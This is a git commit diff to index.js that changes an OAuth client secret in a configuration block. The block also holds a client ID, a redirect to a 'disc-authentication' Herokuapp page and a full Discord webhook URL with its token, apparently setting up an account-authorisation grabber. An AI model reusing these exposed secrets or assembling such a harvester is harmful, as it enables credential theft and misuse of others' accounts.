51cc72ed3e48e971003d17006779d67180d30131
SkyblockScriptz <102599352+SkyblockScriptz@users.noreply.github.com>
2022-10-25 20:49:05 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 // Configuration
-const client_secret = 'fcc2cabf-20a8-42e6-96e0-80b398b62fbf'
+const client_secret = '6f1b61b7-aec9-4fcf-ae43-349239493871'
 const client_id = 'fcc2cabf-20a8-42e6-96e0-80b398b62fbf'
 const redirect_uri = 'https://disc-authentication.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1034525290875060314/bus7n2Ux68ZnpB9uJSLqxQpKWneN_RVT8QtBd6HKqxSBT_r3m61ud_cMt0b8JunX2p9W'
